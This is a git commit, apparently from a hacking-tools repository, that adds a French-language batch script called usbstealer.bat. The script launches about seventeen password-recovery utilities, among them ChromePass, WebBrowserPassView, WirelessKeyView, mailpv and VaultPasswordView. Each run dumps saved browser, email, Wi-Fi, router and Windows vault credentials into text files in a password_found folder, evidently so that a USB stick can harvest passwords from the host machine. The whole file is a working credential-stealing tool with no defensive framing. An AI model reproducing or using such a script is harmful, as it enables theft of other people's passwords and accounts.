8ae404dd398d4ba1824f56a62d9b3a806db31423
c2Vuc2Vp <73338752+c2Vuc2Vp@users.noreply.github.com>
2020-10-24 10:48:17 +0000

    Add files via upload

---
+++ autres/usb/usbstealer.bat
@@ -0,0 +1,29 @@
+echo.
+start autres/usb/pass/BulletsPassView.exe /stext autres/usb/password_found/BulletsPassView.txt
+start autres/usb/pass/ChromePass.exe /stext autres/usb/password_found/ChromePass.txt
+start autres/usb/pass/CredentialsFileView.exe /stext autres/usb/password_found/CredentialsFileView.txt
+start autres/usb/pass/DataProtectionDecryptor.exe /stext autres/usb/password_found/DataProtectionDecryptor.txt
+start autres/usb/pass/Dialupass.exe /stext autres/usb/password_found/Dialupass.txt
+start autres/usb/pass/EncryptedRegView.exe /stext autres/usb/password_found/EncryptedRegView.txt
+start autres/usb/pass/iepv.exe /stext autres/usb/password_found/iepv.txt
+start autres/usb/pass/mailpv.exe /stext autres/usb/password_found/mailpv.txt
+start autres/usb/pass/mspass.exe /stext autres/usb/password_found/mspass.txt
+start autres/usb/pass/netpass.exe /stext autres/usb/password_found/netpass.txt
+start autres/usb/pass/PasswordFox.exe /stext autres/usb/password_found/PasswordFox.txt
+start autres/usb/pass/PstPassword.exe /stext autres/usb/password_found/PstPassword.txt
+start autres/usb/pass/RouterPassView.exe /stext autres/usb/password_found/RouterPassView.txt
+start autres/usb/pass/SniffPass.exe /stext autres/usb/password_found/SniffPass.txt
+start autres/usb/pass/VaultPasswordView.exe /stext autres/usb/password_found/VaultPasswordView.txt
+start autres/usb/pass/WebBrowserPassView.exe /stext autres/usb/password_found/WebBrowserPassView.txt
+start autres/usb/pass/WirelessKeyView.exe /stext autres/usb/password_found/WirelessKeyView.txt
+echo.
+echo        ##########################################################
+echo        #                                                        #
+echo        #                                                        #
+echo        #         Veuillez lire les fichiers dans                #
+echo        #         le autres/usb/dossier password_found.          #
+echo        #                                                        #
+echo        #                                                        #
+echo        ##########################################################
+echo.
+ping 127.0.0.1 -n 2 > nul
